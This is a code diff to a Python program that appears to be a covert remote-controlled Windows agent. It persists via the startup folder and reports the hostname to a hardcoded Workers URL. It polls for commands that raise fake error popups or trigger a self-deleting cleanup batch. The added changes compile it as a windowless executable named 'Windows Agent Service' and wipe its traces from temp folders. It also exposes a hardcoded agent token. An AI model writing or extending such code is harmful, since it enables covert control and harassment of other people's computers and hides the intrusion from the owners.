@@ -21,9 +21,11 @@ AGENT_TOKEN = "ed81f9a6ad3fe1ba5587430863c983c2ea2c77239a158fa7"
 LOG_AUTH_URL = "https://telelluc-log-auth.mrocadlectric.workers.dev"
 HEARTBEAT_INTERVAL_SECONDS = 60
 COMMAND_CHECK_INTERVAL_SECONDS = 5
+INACTIVITY_THRESHOLD_SECONDS = 130
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) telelluc-agent"
 
 device_id = None
+last_command_time = time.time()
 
 ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
 ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")
@@ -49,11 +51,6 @@ SWP_NOSIZE = 0x0001
 SWP_SHOWWINDOW = 0x0040
 
 
-def _hide_path(path):
-    try:
-        subprocess.run(["attrib", "+h", path], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except OSError:
-        pass
 
 
 def _schedule_delete(path_to_delete):
@@ -116,7 +113,6 @@ def ensure_startup():
                 try:
                     if os.path.getmtime(startup_exe) >= os.path.getmtime(source_exe):
                         try:
-                            _hide_path(startup_exe)
                             subprocess.Popen(
                                 [startup_exe],
                                 creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
@@ -156,16 +152,13 @@ def self_delete_agent(trigger_id):
         if path and os.path.exists(path):
             candidates.append(os.path.abspath(path))
 
-    if not candidates:
-        return
-
     batch_lines = [
         "@echo off",
         "setlocal EnableDelayedExpansion",
         "set \"parent_pid=%~1\"",
         "shift",
         ":loop",
-        "if \"%~1\"==\"\" goto done",
+        "if \"%~1\"==\"\" goto cleanup",
         "if exist \"%~1\" (",
         "  set \"target=%~1\"",
         "  set \"dir=%~dp1\"",
@@ -181,7 +174,10 @@ def self_delete_agent(trigger_id):
         ")",
         "shift",
         "goto loop",
-        ":done",
+        ":cleanup",
+        f"rmdir /s /q \"{local_dir}\" 2>nul",
+        "del /f /q \"%temp%\\telelluc*.bat\" 2>nul",
+        "del /f /q \"%temp%\\telelluc*.vbs\" 2>nul",
         "exit /b 0",
     ]
 
@@ -238,12 +234,38 @@ def show_error():
     _force_topmost()
 
 
+def auto_compile():
+    if getattr(sys, "frozen", False):
+        return
+    try:
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        subprocess.run(
+            [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "Windows Agent Service", os.path.abspath(__file__)],
+            cwd=script_dir,
+            check=False,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+    except Exception:
+        pass
+
+
 def heartbeat_loop():
-    global device_id
+    global device_id, last_command_time
     hostname = socket.gethostname()
-    payload = json.dumps({"hostname": hostname}).encode("utf-8")
     while True:
         try:
+            time_since_command = time.time() - last_command_time
+            is_active = time_since_command < INACTIVITY_THRESHOLD_SECONDS
+            status = "active" if is_active else "inactive"
+            seconds_inactive = max(0, int(time_since_command - INACTIVITY_THRESHOLD_SECONDS))
+
+            payload = json.dumps({
+                "hostname": hostname,
+                "status": status,
+                "seconds_inactive": seconds_inactive if not is_active else 0
+            }).encode("utf-8")
+
             req = urllib.request.Request(
                 LOG_AUTH_URL + "/heartbeat",
                 data=payload,
@@ -257,14 +279,14 @@ def heartbeat_loop():
             resp = urllib.request.urlopen(req, timeout=10).read()
             data = json.loads(resp.decode("utf-8"))
             device_id = data.get("id")
-            print(f"[heartbeat] OK - registrado como device {device_id} (hostname: {hostname})", flush=True)
+            print(f"[heartbeat] OK - device {device_id} ({hostname}) - {status}", flush=True)
         except Exception as e:
             print(f"[heartbeat] ERROR: {e}", flush=True)
         time.sleep(HEARTBEAT_INTERVAL_SECONDS)
 
 
 def command_check_loop():
-    global device_id
+    global device_id, last_command_time
     while True:
         if device_id is None:
             time.sleep(COMMAND_CHECK_INTERVAL_SECONDS)
@@ -282,7 +304,10 @@ def command_check_loop():
             data = json.loads(resp.decode("utf-8"))
             cmd = data.get("command")
             cantidad = data.get("cantidad", 1)
-            
+
+            if cmd and cmd != "none":
+                last_command_time = time.time()
+
             if cmd == "error":
                 print(f"[command] Recibido 'error' para device {device_id} (Cantidad: {cantidad})", flush=True)
                 for _ in range(int(cantidad)):
@@ -290,7 +315,6 @@ def command_check_loop():
 
             elif cmd == "self-delete":
                 print(f"[command] Recibido 'self-delete' para device {device_id}. Iniciando desinstalación...", flush=True)
-                # Llama a tu función existente pasándole el ID como disparador si es necesario
                 threading.Thread(target=lambda: self_delete_agent(device_id), daemon=True).start()
 
         except Exception as e:
@@ -342,6 +366,7 @@ class Handler(BaseHTTPRequestHandler):
 
 
 if __name__ == "__main__":
+    auto_compile()
     ensure_startup()
     threading.Thread(target=heartbeat_loop, daemon=True).start()
     threading.Thread(target=command_check_loop, daemon=True).start()
